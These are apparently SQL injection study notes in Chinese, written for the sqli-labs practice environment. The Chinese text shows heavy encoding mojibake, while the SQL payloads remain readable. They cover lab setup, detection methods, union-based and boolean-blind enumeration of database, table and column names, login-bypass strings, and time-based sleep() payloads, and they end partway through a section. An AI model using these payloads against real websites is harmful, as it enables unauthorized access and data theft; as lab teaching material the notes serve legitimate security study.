# SQLæ³¨å…¥
ğŸ“[sqli-labs-master.zip](https://www.yuque.com/attachments/yuque/0/2022/zip/22941704/1667991587463-94414de8-d1cb-4b9c-ae76-19a6ea12b64b.zip)
### å…³äºé¶åœºæ­å»º
1. phpç‰ˆæœ¬é—®é¢˜

PHPç‰ˆæœ¬ä¸å…¼å®¹çš„ç¼˜æ•…ï¼Œå¯ä»¥é€šè¿‡æŠŠPHPç‰ˆæœ¬æ¢åˆ°5.xç‰ˆæœ¬è§£å†³ï¼Œç»è¿‡å°è¯•æœ€ä¼˜é€‰æ‹©åº”è¯¥æ˜¯5.4.45ç‰ˆæœ¬
å› ä¸ºPHP5.xç‰ˆæœ¬æ—¶ï¼Œphpè¿æ¥Mysqlæ•°æ®åº“ä¼šä½¿ç”¨`mysql_connect()`è¿æ¥ï¼ŒPHP7.xç‰ˆæœ¬è¿æ¥æ•°æ®åº“ä¼šä½¿ç”¨`mysqli_connect()`è¿æ¥ï¼Œè€ŒGitHubä¸Šçš„æºç æœ€è¿‘æ›´æ–°å·²ç»æ˜¯äº”å¹´å‰äº†ï¼Œæ‰€ä»¥å¯¹PHPé«˜ç‰ˆæœ¬ä¼šå‡ºç°ä¸å…¼å®¹çš„æƒ…å†µã€‚

å…³äºå°†`magic_quotes_gpc`æ”¹ä¸º`off`ï¼ˆå¼€å¯`magic_quotes_gpc=on`ä¹‹åï¼Œç›¸å½“äºä½¿ç”¨`addslshes()`è¿™ä¸ªå‡½æ•°ï¼Œä¼šåœ¨å•å¼•å·å‰åŠ åæ–œçº¿æ³¨é‡Šï¼‰ä»¥é¿å…å•å¼•å·è¢«è‡ªåŠ¨åŠ åæ–œçº¿ï¼ˆ/ï¼‰æ³¨é‡Šæ‰çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æ¢phpç‰ˆæœ¬æ¥è§£å†³

2. mysqlç‰ˆæœ¬é—®é¢˜

ç»æµ‹è¯•ä½ç‰ˆæœ¬åœ¨æŸ¥è¡¨æ—¶ä¼šå‡ºé”™ï¼Œæ•…ç›´æ¥ä½¿ç”¨æœ€æ–°ç‰ˆæœ¬å³8.0.12ç‰ˆæœ¬å³å¯

3. å…³äºé…ç½®æ–‡ä»¶çš„é—®é¢˜

ä¸‹é¢è¿™ç¯‡åšå®¢é‡Œæ”¶å½•ä¸€äº›å¸¸è§é—®é¢˜ï¼Œé‡Œé¢çš„å‘å…¨éƒ½è¸©è¿‡ä¸€é
https://blog.csdn.net/qq_43968080/article/details/103613087

4. 80ç«¯å£è¢«å ç”¨é—®é¢˜

è¿™ä¸ªé—®é¢˜å¯èƒ½å±äºä¸ªåˆ«ç°è±¡ï¼Œä½†æ˜¯å›°æ‰°æˆ‘å¾ˆä¹…ï¼Œäºæ˜¯åœ¨æ­¤ä¹Ÿè®°å½•ä¸‹æ¥

ç¬¬ä¸€ç±»ï¼šè¢«systemå ç”¨ï¼Œå‚è€ƒhttps://www.cnblogs.com/selier/p/9514426.html
https://blog.csdn.net/weixin_44248000/article/details/103432778

ç¬¬äºŒç±»ï¼šè¢«httpd.exeå ç”¨ï¼Œå‚è€ƒhttps://blog.csdn.net/speedwaycl/article/details/49023223
ä¸€ä¸ªæœªç»å°è¯•çš„è§£å†³åŠæ³•https://www.cnblogs.com/starksoft/p/9131665.html

## Mysql

### åŸç†åŠåŸºæœ¬æ€è·¯
#### åŸç†

~~å­¦ä¹ å‰å»ºè®®å…ˆäº†è§£åŸºç¡€çš„mysqlè¯­è¨€~~

å½“æˆ‘ä»¬è®¿é—®åŠ¨æ€ç½‘é¡µæ—¶, Web æœåŠ¡å™¨ä¼šå‘æ•°æ®è®¿é—®å±‚å‘èµ· Sql æŸ¥è¯¢è¯·æ±‚ï¼Œå¦‚æœæƒé™éªŒè¯é€šè¿‡å°±ä¼šæ‰§è¡Œ Sql è¯­å¥ã€‚
è¿™ç§ç½‘ç«™å†…éƒ¨ç›´æ¥å‘é€çš„Sqlè¯·æ±‚ä¸€èˆ¬ä¸ä¼šæœ‰å±é™©ï¼Œä½†å®é™…æƒ…å†µæ˜¯å¾ˆå¤šæ—¶å€™éœ€è¦**ç»“åˆç”¨æˆ·çš„è¾“å…¥æ•°æ®åŠ¨æ€æ„é€  Sql è¯­å¥**ï¼›å½“ç”¨æˆ·ä½¿ç”¨sqlæŸ¥è¯¢è¯­å¥æ—¶æ²¡æœ‰éµå¾ª**ä»£ç ä¸æ•°æ®åˆ†ç¦»**ï¼Œè¾“å…¥çš„æ•°æ®å°±ä¼šè¢«å½“ä½œä»£ç æ‰§è¡Œ

#### æ€è·¯

##### åˆ¤æ–­æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥

åˆ¤æ–­æ–¹æ³•ï¼š

1.idååŠ å•å¼•å·ï¼Œæ ¹æ®é”™è¯¯æç¤ºè·å–ä¿¡æ¯ï¼ˆ**å­—ç¬¦å‹æ³¨å…¥**ï¼‰

åŸç†æ˜¯**å•å¼•å·æˆåŠŸè¢«æ•°æ®åº“è§£æ**ï¼Œè€Œæ— è®ºå­—ç¬¦å‹è¿˜æ˜¯æ•´å‹éƒ½ä¼š**å› ä¸ºå•å¼•å·ä¸ªæ•°ä¸åŒ¹é…**è€ŒæŠ¥é”™,æ— æŠ¥é”™å¹¶ä¸ä»£è¡¨ä¸å­˜åœ¨sqlæ³¨å…¥æ¼æ´ï¼Œå› ä¸ºé¡µé¢å¯èƒ½å¯¹å•å¼•å·ä½œäº†è¿‡æ»¤ï¼Œè¿™æ—¶å¯ä»¥è€ƒè™‘ä½¿ç”¨**åˆ¤æ–­è¯­å¥**è¿›è¡Œæ³¨å…¥

ä¾‹å¦‚è®¿é—®`id=1' order by 1%23`ï¼Œé¡µé¢å›æ˜¾çš„sqlè¯­å¥æ˜¯`SELECT * FROM users WHERE id='1' order by 1#'LIMIT0,1`ï¼Œç”±äº#åé¢çš„è¯­å¥éƒ½ä¼šè¢«æ³¨é‡Šæ‰ï¼Œæ‰€ä»¥çœŸæ­£æ‰§è¡Œçš„è¯­å¥æ˜¯`SELECT * FROM users WHERE id='1' order by 1`

æ­¤å¤„`%23`å³ä¸ºurlç¼–ç ä¸­çš„`#`ï¼Œåœ¨mysqlä¸­`#`çš„ä½œç”¨æ˜¯æ³¨é‡Šç¬¦ï¼ˆ`--+`ï¼›`--` ï¼›`#`ï¼›å‡ä¸ºæ³¨é‡Šç¬¦å·ï¼‰

2.1=1ã€1=2æµ‹è¯•æ³•ï¼Œæµç¨‹å¦‚ä¸‹ï¼ˆ**æ•°å­—å‹æ³¨å…¥**ï¼‰

â‘  `url?id=1`â‘¡ `url?id=1 ;and 1=1`â‘¢ `url?id=1 ;and 1=2`

å­˜åœ¨æ³¨å…¥æ¼æ´çš„è¡¨ç°:

> åŸç†æ˜¯:åˆ¤æ–­åŸç½‘å€æ˜¯å¦å¯¹è¾“å…¥ä¿¡æ¯æœ‰è¿‡æ»¤

â‘  æ­£å¸¸æ˜¾ç¤ºï¼›â‘¡ æ­£å¸¸æ˜¾ç¤ºï¼Œå†…å®¹åŸºæœ¬ä¸â‘ ç›¸åŒï¼›â‘¢ æç¤º`BOF`æˆ–`EOF`ï¼ˆç¨‹åºæ²¡åšä»»ä½•åˆ¤æ–­æ—¶ï¼‰ã€æˆ–æç¤ºæ‰¾ä¸åˆ°è®°å½•ï¼ˆåˆ¤æ–­äº†rs.eofæ—¶ï¼‰ã€æˆ–æ˜¾ç¤ºå†…å®¹ä¸ºç©ºï¼ˆç¨‹åºåŠ äº†`on error resume next`ï¼‰

ä¸å­˜åœ¨çš„è¡¨ç°ï¼š

â‘ åŒæ ·æ­£å¸¸æ˜¾ç¤ºï¼Œâ‘¡å’Œâ‘¢ä¸€èˆ¬éƒ½ä¼šæœ‰ç¨‹åºå®šä¹‰çš„é”™è¯¯æç¤ºï¼Œæˆ–æç¤ºç±»å‹è½¬æ¢æ—¶å‡ºé”™ã€‚

 è¿˜å¯ä»¥ä½¿ç”¨ç‰¹å®šå‡½æ•°æ¥åˆ¤æ–­ï¼Œæ¯”å¦‚è¾“å…¥`1 and version()>0`ï¼Œç¨‹åºè¿”å›æ­£å¸¸ï¼Œè¯´æ˜`version()`å‡½æ•°è¢«æ•°æ®åº“è¯†åˆ«å¹¶æ‰§è¡Œï¼Œè€Œ`version()`å‡½æ•°æ˜¯MySQLç‰¹æœ‰çš„å‡½æ•°ï¼Œå› æ­¤å¯ä»¥æ¨æ–­åå°æ•°æ®åº“ä¸ºMySQLã€‚

**æ•°å€¼å‹æ³¨å…¥å¸¸ç”¨æ€»ç»“**
??? "ç‚¹å‡»å±•å¼€/æ”¶èµ·"

    and1=2--+

    'and1=2--+
    
    "and1=2--+
    
    )and1=2--+
    
    ')and1=2--+
    
    ")and1=2--+
    
    "))and1=2--+

##### `union`è”åˆæ³¨å…¥

> åˆ©ç”¨unionè”åˆæ³¨å…¥æˆ–å…¶ä»–è¯­å¥æ¥è·å–æƒ³è¦å¾—åˆ°çš„ä¿¡æ¯

`ORDER BY`è¯­å¥çš„ç®€å•åº”ç”¨

`ORDER BY` è¯­å¥ç”¨äº**æ ¹æ®æŒ‡å®šçš„åˆ—å¯¹ç»“æœé›†è¿›è¡Œæ’åº**ã€‚

åœ¨1'åˆ¤æ–­çš„ä¾‹å­ä¸­ï¼Œ`order by` è¯­å¥ç”¨äºçŒœè§£å­—æ®µæ•°å’Œåˆ—æ•°ï¼Œè‹¥ä¸å­˜åœ¨åˆ™ä¼šå›æ˜¾å‡ºé”™

`1' order by n--+`   ï¼Œnä¸ºæŒ‡å®šåˆ—

ORDER BY è¯­å¥é»˜è®¤æŒ‰ç…§å‡åºå¯¹è®°å½•è¿›è¡Œæ’åºï¼Œå¦‚æœå¸Œæœ›æŒ‰ç…§é™åºå¯¹è®°å½•è¿›è¡Œæ’åºï¼Œå¯ä»¥ä½¿ç”¨ `DESC` å…³é”®å­—ï¼Œä¾‹å¦‚

ä»¥å­—æ¯é¡ºåºæ˜¾ç¤ºå…¬å¸åç§°ï¼ˆCompanyï¼‰

`SELECT Company, OrderNumber FROM Orders ORDER BY Company`

ä»¥é€†å­—æ¯é¡ºåºæ˜¾ç¤ºå…¬å¸åç§°

`SELECT Company, OrderNumber FROM Orders ORDER BY Company DESC`

ä¸€äº›å¸¸ç”¨çš„è”åˆæŸ¥è¯¢è¯­å¥

`1' union select database(),user()#`

- `database()`å°†ä¼šè¿”å›å½“å‰ç½‘ç«™æ‰€ä½¿ç”¨çš„æ•°æ®åº“åå­—.

- `user()`å°†ä¼šè¿”å›æ‰§è¡Œå½“å‰æŸ¥è¯¢çš„ç”¨æˆ·å.

`1' union select version(),@@version_compile_os#`

- `version()` è·å–å½“å‰æ•°æ®åº“ç‰ˆæœ¬.

- `@@version_compile_os` è·å–å½“å‰æ“ä½œç³»ç»Ÿ

`1' union select table_name,table_schema from information_schema.tables where table_schema= '[ ]'#`

é€šè¿‡æ­¤è¯­å¥å¯ä»¥æŸ¥è¯¢åˆ°**æŒ‡å®šåº“å†…çš„æ‰€æœ‰è¡¨å’Œè¡¨å**ï¼Œæœ€åçš„æ–¹æ¡†ä¸­å¡«å…¥æƒ³è¦æŸ¥è¯¢çš„æ•°æ®åº“åå³å¯

`information_schema` æ˜¯ `mysql` è‡ªå¸¦çš„ä¸€å¼ è¡¨ï¼Œè¿™å¼ æ•°æ®è¡¨ä¿å­˜äº† Mysql æœåŠ¡å™¨æ‰€æœ‰æ•°æ®åº“çš„ä¿¡æ¯,å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨æ çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ã€‚è¯¥æ•°æ®åº“æ‹¥æœ‰ä¸€ä¸ªåä¸º `tables` çš„æ•°æ®è¡¨ï¼Œè¯¥è¡¨åŒ…å«ä¸¤ä¸ªå­—æ®µ table_name å’Œ table_schemaï¼Œåˆ†åˆ«è®°å½• DBMS ä¸­çš„å­˜å‚¨çš„è¡¨åå’Œè¡¨åæ‰€åœ¨çš„æ•°æ®åº“ã€‚

`-1' union select 1,2,(concat_ws(char(),user(),version(),database()))%23`

èƒ½å¤Ÿè·å–å½“å‰æ•°æ®åº“çš„åº“åï¼Œç‰ˆæœ¬å’Œè¿æ¥ç”¨æˆ·ï¼Œå…¶ä¸­`concat_ws()`å‡½æ•°çš„ä½œç”¨æ˜¯ä»æ•°æ®åº“é‡Œå–nä¸ªå­—æ®µç»„åˆåˆ°ä¸€èµ·å¹¶ç”¨ç¬¦å·åˆ†å‰²æ˜¾ç¤ºï¼Œ`char()`èƒ½å¤Ÿå°†åè¿›åˆ¶ASCIIç è½¬æ¢ä¸ºå­—ç¬¦ï¼Œ%23ä¸ºurlç¼–ç ä¸­çš„#

- `group_concat()`ä¸`concat_ws()`çš„åŒºåˆ«æ˜¯å‰è€…å°†**åˆ—**ç»„åˆæ˜¾ç¤ºï¼Œåè€…å°†**è¡Œ**ç»„åˆæ˜¾ç¤º

- `information_schema`ï¼šè¡¨ç¤ºæ‰€æœ‰ä¿¡æ¯ï¼ŒåŒ…æ‹¬åº“ã€è¡¨ã€åˆ—

- `information_schema.tables`ï¼šè®°å½•æ‰€æœ‰è¡¨åä¿¡æ¯çš„è¡¨

- `information_schema.columns`ï¼šè®°å½•æ‰€æœ‰åˆ—åä¿¡æ¯çš„è¡¨

- `table_schema`ï¼šæ•°æ®åº“çš„åç§°

- `table_name`:è¡¨å

- `column_name`:åˆ—å

- `group_concat()`:æ˜¾ç¤ºæ‰€æœ‰æŸ¥è¯¢åˆ°çš„æ•°æ®

##### æ¼æ´åˆ©ç”¨æ‰‹æ³•

1.åˆ©ç”¨ Sql æ¼æ´ç»•è¿‡ç™»å½•éªŒè¯

> åˆ©ç”¨æ³¨é‡Šç¬¦#å’Œ1=1çš„æ’æˆç«‹æ¥ç»•è¿‡ç™»é™†éªŒè¯

ä¸€èˆ¬æƒ…å†µä¸‹å¼±ç±»å‹å¯†ç æ˜¯å¾ˆéš¾æ‰‹åŠ¨çˆ†ç ´çš„ï¼Œä¾‹å¦‚123

ä½†æ˜¯è‹¥å­˜åœ¨sqlæ¼æ´ï¼Œåœ¨ç”¨æˆ·åä¸­è¾“å…¥ `123' or 1=1 #`, å¯†ç è¾“å…¥ `123' or 1=1 #`ï¼ˆä¹Ÿå¯ç©ºç™½ï¼‰ï¼Œåˆ™å¯ä»¥éªŒè¯æˆåŠŸ

å®é™…æ‰§è¡Œçš„è¯­å¥æ˜¯ï¼š

`select * from users where username='123' or 1=1 #' and password='123' or 1=1 #'`

æŒ‰ç…§ Mysql è¯­æ³•ï¼Œ# åé¢çš„å†…å®¹ä¼šè¢«å¿½ç•¥ï¼Œæ‰€ä»¥å®é™…æ‰§è¡Œçš„è¯­å¥å¦‚ä¸‹

`select * from users where username='123' or 1=1 `


åœ¨ç”¨æˆ·åä¸­è¾“å…¥ `123' or '1'='1`, å¯†ç è¾“å…¥ `123' or '1'='1`ï¼ˆä¸åŠ å•å¼•å·ä¼šé€ æˆè¯­æ³•é”™è¯¯ï¼‰ï¼Œå®é™…æ‰§è¡Œè¯­å¥å¦‚ä¸‹

`select * from users where username='123' or '1'='1' and password='123' or '1'='1`

**oræ¡ä»¶ä½¿andä¸¤ç«¯éªŒè¯ç»“æœæœ‰ä¸€ä¸ªæˆç«‹å³å¯éƒ½æˆç«‹ï¼Œä»è€Œç»•è¿‡éªŒè¯ï¼Œæ— éœ€ä½¿ç”¨æ³¨é‡Šç¬¦**

#### å…¶ä»–å®ç”¨è¯­å¥

1.`INSERT INTO`è¯­å¥ï¼Œç”¨äºå‘è¡¨ä¸­æ’å…¥æ–°çš„è¡Œæˆ–åˆ—

- `INSERT INTO è¡¨åç§° VALUES (å€¼1, å€¼2,....`

- `INSERT INTO table_name (åˆ—1, åˆ—2,...) VALUES (å€¼1, å€¼2,....)`

2.`SQL UPDATE` è¯­å¥ï¼Œç”¨äºä¿®æ”¹è¡¨ä¸­æ•°æ®

- `UPDATE è¡¨åç§° SET åˆ—åç§° = æ–°å€¼ WHERE åˆ—åç§° = æŸå€¼`

3.`DELETE` è¯­å¥ï¼Œç”¨äºåˆ é™¤è¡¨ä¸­çš„è¡Œ

- `DELETE FROM è¡¨åç§° WHERE åˆ—åç§° = å€¼`

å¯ä»¥åœ¨ä¸åˆ é™¤è¡¨çš„æƒ…å†µä¸‹åˆ é™¤æ‰€æœ‰çš„è¡Œï¼ŒåŒæ—¶ä¿æŒè¡¨çš„ç»“æ„ã€å±æ€§å’Œç´¢å¼•å®Œæ•´

- `DELETE FROM table_name`
- `DELETE * FROM table_name`

æ˜Ÿå·ï¼ˆ*ï¼‰æ˜¯é€‰å–æ‰€æœ‰åˆ—çš„å¿«æ·æ–¹å¼ã€‚

#### SQL é€šé…ç¬¦

åœ¨æœç´¢æ•°æ®åº“ä¸­çš„æ•°æ®æ—¶ï¼ŒSQL é€šé…ç¬¦å¯ä»¥æ›¿ä»£ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ã€‚

åœ¨ SQL ä¸­ï¼Œå¯ä½¿ç”¨ä»¥ä¸‹é€šé…ç¬¦ï¼š

é€šé…ç¬¦	æè¿°
%	ä»£è¡¨é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦
_	ä»…æ›¿ä»£ä¸€ä¸ªå­—ç¬¦
[charlist]	å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦
[^charlist]æˆ–è€…[!charlist]	ä¸åœ¨å­—ç¬¦åˆ—ä¸­çš„ä»»ä½•å•ä¸€å­—ç¬¦

`SELECT * FROM è¡¨å WHERE åˆ—å LIKE '[   ]'`

åœ¨[  ]ä¸­ï¼Œå¯åˆ©ç”¨é€šé…ç¬¦æŸ¥æ‰¾ä¸æŒ‡å®šå€¼ï¼ˆä¾‹å¦‚123ï¼‰ç›¸å…³çš„æ•°æ®

`123%`ä»¥123å¼€å¤´çš„æ•°æ®ï¼›`%123%`åŒ…å«123çš„æ•°æ®ï¼›`_123`ç¬¬ä¸€ä¸ªå­—ç¬¦åæ˜¯123çš„æ•°æ®ï¼ŒåŒç†`1_2_3`

### å¸¸è§æ³¨å…¥æ–¹æ³•

#### å¸ƒå°”ç›²æ³¨

å¸ƒå°”ç›²æ³¨ä¸€èˆ¬é€‚ç”¨äºé¡µé¢æ²¡æœ‰å›æ˜¾å­—æ®µ(ä¸æ”¯æŒè”åˆæŸ¥è¯¢)ï¼Œä¸”webé¡µé¢è¿”å›`True` æˆ–è€… `false`ï¼Œæ„é€ SQLè¯­å¥ï¼Œåˆ©ç”¨andï¼Œorç­‰å…³é”®å­—æ¥å…¶åçš„è¯­å¥ true ã€ falseä½¿webé¡µé¢è¿”å›trueæˆ–è€…falseï¼Œä»è€Œè¾¾åˆ°æ³¨å…¥çš„ç›®çš„æ¥è·å–ä¿¡æ¯

    ascii() å‡½æ•°ï¼Œè¿”å›å­—ç¬¦asciiç å€¼
        å‚æ•° : strå•å­—ç¬¦
    length() å‡½æ•°ï¼Œè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦
        å‚æ•° : str å­—ç¬¦ä¸²
    left() å‡½æ•°ï¼Œè¿”å›ä»å·¦è‡³å³æˆªå–å›ºå®šé•¿åº¦çš„å­—ç¬¦ä¸²
        å‚æ•°str,length
        str : å­—ç¬¦ä¸²
        lengthï¼šæˆªå–é•¿åº¦
    substr()/substring() å‡½æ•° ï¼Œ è¿”å›ä»posä½ç½®å¼€å§‹åˆ°lengthé•¿åº¦çš„å­å­—ç¬¦ä¸²
        å‚æ•°ï¼Œstrï¼Œposï¼Œlength
        str: å­—ç¬¦ä¸²
        posï¼šå¼€å§‹ä½ç½®
        lengthï¼š æˆªå–é•¿åº¦

##### æ³¨å…¥æµç¨‹

~~ä¸€èˆ¬ä¸º~~
??? "ç‚¹å‡»å±•å¼€/æ”¶èµ·"

    ï¼ˆ1ï¼‰æ±‚å½“å‰æ•°æ®åº“é•¿åº¦

    ï¼ˆ2ï¼‰æ±‚å½“å‰æ•°æ®åº“è¡¨çš„ASCII

    ï¼ˆ3ï¼‰æ±‚å½“å‰æ•°æ®åº“ä¸­è¡¨çš„ä¸ªæ•°

    ï¼ˆ4ï¼‰æ±‚å½“å‰æ•°æ®åº“ä¸­å…¶ä¸­ä¸€ä¸ªè¡¨åçš„é•¿åº¦

    ï¼ˆ5ï¼‰æ±‚å½“å‰æ•°æ®åº“ä¸­å…¶ä¸­ä¸€ä¸ªè¡¨åçš„ASCII

    ï¼ˆ6ï¼‰æ±‚åˆ—åçš„æ•°é‡

    ï¼ˆ7ï¼‰æ±‚åˆ—åçš„é•¿åº¦

    ï¼ˆ8ï¼‰æ±‚åˆ—åçš„ASCII

    ï¼ˆ9ï¼‰æ±‚å­—æ®µçš„æ•°é‡

    ï¼ˆ10ï¼‰æ±‚å­—æ®µå†…å®¹çš„é•¿åº¦

    ï¼ˆ11ï¼‰æ±‚å­—æ®µå†…å®¹å¯¹åº”çš„ASCII

   æ­¥éª¤éå¸¸ç¹ç

##### ç›¸å…³sqlè¯­å¥

??? "ç‚¹å‡»å±•å¼€/æ”¶èµ·"
    ###### æ±‚å½“å‰æ•°æ®åº“çš„é•¿åº¦

    æ€è·¯ï¼šåˆ©ç”¨`length`æˆ–è€…`substr`å‡½æ•°æ¥å®Œæˆ

    `length`å‡½æ•°

    - str    è¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦

    `substr`å‡½æ•°

    - str    å­—ç¬¦ä¸²
    - pos    æˆªå–å­—ç¬¦ä¸²å¼€å§‹ä½ç½®

    `length`    æˆªå–å­—ç¬¦çš„é•¿åº¦

    `length` å‡½æ•°è¿”å›é•¿åº¦ï¼Œä¾‹å¦‚8æ˜¯å½“å‰æ•°æ®åº“'security'çš„é•¿åº¦

    `SELECT * from users WHERE id = 1 and (length(database())=8)`

    - ä¹Ÿå¯ä»¥ä½¿ç”¨ `> `ã€`<` ç¬¦å·æ¥è¿›ä¸€æ­¥ç¼©å°èŒƒå›´

    `SELECT * from users WHERE id = 1 and (length(database())>8)`

    - å½“é•¿åº¦æ­£ç¡®å°±é¡µé¢å°±æ˜¾ç¤ºæ­£å¸¸ï¼Œå…¶ä½™é¡µé¢åˆ™æ˜¾ç¤ºé”™è¯¯

    `substr`å‡½æ•°

    åœ¨æ„é€ SQLè¯­å¥ä¹‹æ—¶ï¼Œandåé¢å¦‚æœè·Ÿç€ä¸€ä¸ªå¤§äº0çš„æ•°ï¼Œé‚£ä¹ˆSQLè¯­å¥æ­£ç¡®æ‰§è¡Œï¼Œæ‰€ä»¥åˆ©ç”¨æ­¤ç‰¹æ€§ï¼Œä½¿ç”¨`substr`æˆªå–å­—ç¬¦ï¼Œå½“æˆªå–çš„å­—ç¬¦ä¸å­˜åœ¨ï¼Œå†é€šè¿‡`ascii`å‡½æ•°å¤„ç†ä¹‹åå°†ä¼šå˜æˆfalseï¼Œé¡µé¢å°†å›æ˜¾é”™è¯¯

    - `substr` è¿”å›å­å­—ç¬¦ä¸²
    - 8æ˜¯å½“å‰æ•°æ®åº“'security'çš„é•¿åº¦ ï¼Œä»ç¬¬8ä¸ªå¼€å§‹ï¼Œå–1ä½ï¼Œåˆ™æ˜¯'y'
    - å¦‚æœposä¸º9 é‚£ä¹ˆå¼€å§‹ä½ç½®å¤§äºå­—ç¬¦ä¸²é•¿åº¦ï¼Œasciiå‡½æ•°å¤„ç†åå°†å˜æˆfalse
    - and ååªè¦ä¸ä¸º 0, é¡µé¢éƒ½ä¼šè¿”å›æ­£å¸¸

    `SELECT * from users WHERE id = 1 and ascii(substr(database(),8,1))`

    ###### æ±‚å½“å‰æ•°æ®åº“å

    æ€è·¯ï¼šåˆ©ç”¨`left` å‡½æ•°ï¼Œä»å·¦è‡³å³æˆªå–å­—ç¬¦ä¸²

    æˆªå–å­—ç¬¦åˆ¤æ–­å­—ç¬¦çš„`ascii`ç ï¼Œä»è€Œç¡®å®šå­—ç¬¦

    -- ä»å·¦è‡³å³æˆªå–ä¸€ä¸ªå­—ç¬¦

    `SELECT * from users WHERE id = 1 and (left(database(),1)='s')`

    -- ä»å·¦è‡³å³æˆªå–ä¸¤ä¸ªå­—ç¬¦

    `SELECT * from users WHERE id = 1 and (left(database(),2)='se')`

    `SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),1,1)) = 115)`

    `SELECT * from users WHERE id = 1 AND (ASCII(SUBSTR(database(),2,1)) = 101)`

    ä½¿ç”¨`>`ï¼Œ`<` ç¬¦å·æ¥æ¯”è¾ƒæŸ¥æ‰¾ï¼Œæ‰¾åˆ°ä¸€ä¸ªèŒƒå›´ï¼Œæœ€åå†ç¡®å®š

    ###### æ±‚å½“å‰æ•°æ®åº“å­˜åœ¨çš„è¡¨çš„æ•°é‡

    `SELECT * from users WHERE id = 1 AND `

    ``(select count(table_name) from information_schema.`TABLES`; where table_schema = database()) = 4``

    ###### æ±‚å½“å‰æ•°æ®åº“è¡¨çš„è¡¨åé•¿åº¦

    - length

    ``SELECT * from users WHERE id = 1 AND (LENGTH((select table_name from information_schema.`TABLES` where table_schema = database() LIMIT 0,1))) = 6``
    
    - substr

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),6,1))``

    ###### æ±‚è¡¨å

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),1,1)) = 101``

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select table_name FROM information_schema.`TABLES` where table_schema = database() LIMIT 0,1),2,1)) = 109``

    ###### æ±‚æŒ‡å®šè¡¨ä¸­åˆ—çš„æ•°é‡

    ``SELECT * from users WHERE id = 1 AND (select count(column_name) from information_schema.columns where table_name = "users") = 3``

    ###### æ±‚æŒ‡å®šè¡¨ä¸­åˆ—çš„é•¿åº¦

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = "users" limit 0,1),2,1))``

    ###### æ±‚æŒ‡å®šè¡¨ä¸­çš„åˆ—å

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select column_name from information_schema.columns where table_name = "users" limit 0,1),1,1)) = 105``

    ###### æ±‚æŒ‡å®šè¡¨ä¸­æŸå­—æ®µçš„æ•°é‡

    ``SELECT * from users WHERE id = 1 AND (select count(username) from users) = 13``

    ###### æ±‚å­—æ®µé•¿åº¦

    ``SELECT * from users WHERE id = 1 AND ASCII(SUBSTR((select username from users  limit 0,1),4,1))``

    ###### æ±‚å­—æ®µå

    ``SELECT * from users WHERE id = 1 and ASCII(SUBSTR((select username from users  limit 0,1),1,1))  = 68``



#### æ—¶é—´ç›²æ³¨

æ—¶é—´ç›²æ³¨åˆç§°å»¶è¿Ÿæ³¨å…¥ï¼Œæ˜¯ä¸€ç§ç›²æ³¨çš„æ‰‹æ³•, æäº¤å¯¹æ‰§è¡Œæ—¶é—´æ•æ„Ÿçš„å‡½æ•°sqlè¯­å¥ï¼Œé€šè¿‡æ‰§è¡Œæ—¶é—´çš„é•¿çŸ­æ¥åˆ¤æ–­æ˜¯å¦æ‰§è¡ŒæˆåŠŸï¼Œæ¯”å¦‚:æ­£ç¡®çš„è¯ä¼šå¯¼è‡´æ—¶é—´å¾ˆé•¿ï¼Œé”™è¯¯çš„è¯ä¼šå¯¼è‡´æ‰§è¡Œæ—¶é—´å¾ˆçŸ­ã€‚~~SQLMAPã€ç©¿å±±ç”²ã€èƒ¡èåœç­‰ä¸»æµæ³¨å…¥å·¥å…·å¯èƒ½æ£€æµ‹ä¸å‡º~~ï¼Œåªèƒ½æ‰‹å·¥æ£€æµ‹ï¼Œæˆ–åˆ©ç”¨è„šæœ¬ç¨‹åºè·‘å‡ºç»“æœã€‚

æ—¶é—´ç›²æ³¨ä¸»è¦ç”¨åˆ°`sleep()`å‡½æ•°ï¼Œé™¤æ­¤ä¹‹å¤–è¿˜æœ‰`benchmark()`

æ—¶é—´ç›²æ³¨æ¯”å¸ƒå°”ç›²æ³¨éš¾åº¦ç¨é«˜ ï¼Œå…³é”®åœ¨äºä¸è®ºä½ æ€ä¹ˆè¾“å…¥å°±æ˜¯ä¸æŠ¥é”™

æ—¶é—´ç›²æ³¨çš„sqlè¯­å¥å¾ˆå¥½ç†è§£ï¼Œå¦‚

##### sleep(seconds)

- seconds: sleepçš„ç§’æ•°

`id= 1â€™ or sleep(3) %23`

å¦‚æœè¿™ä¸ªæ—¶å€™ç›´æ¥æœåŠ¡å™¨è¿‡äº†ä¸‰ç§’æ‰ååº”ï¼Œé‚£ä¹ˆå°±å­˜åœ¨æ—¶é—´æ³¨å…¥

ä¹Ÿå¯ä»¥æ·»åŠ ifè¯­å¥ï¼Œæ§åˆ¶ifç¬¬ä¸€ä¸ªå‚æ•°

`id= 1â€™ or if(1,sleep(3),0) %23`

å¦‚æœæŸä¸€ä¸ªæ¡ä»¶æ­£ç¡®å°±å»¶è¿Ÿä¸‰ç§’ï¼Œå¦‚æœé”™è¯¯å°±è¿”å›0 (ä¹Ÿå°±æ˜¯ifç¬¬ä¸€ä¸ªå‚æ•°ä¸º1)     

å…·ä½“çš„æ³¨å…¥è¯­å¥ç¤ºä¾‹å¦‚ä¸‹

`id= 1â€™ or if((select table_name from information_schema.tables where table_schema=database() limit 0,1),sleep(3),0) %23`

##### benchmark(count, expr)

- count: æ‰§è¡Œæ¬¡æ•°ï¼ˆå¿…é¡»ä¸ºæ­£æ•´æ•°ï¼‰
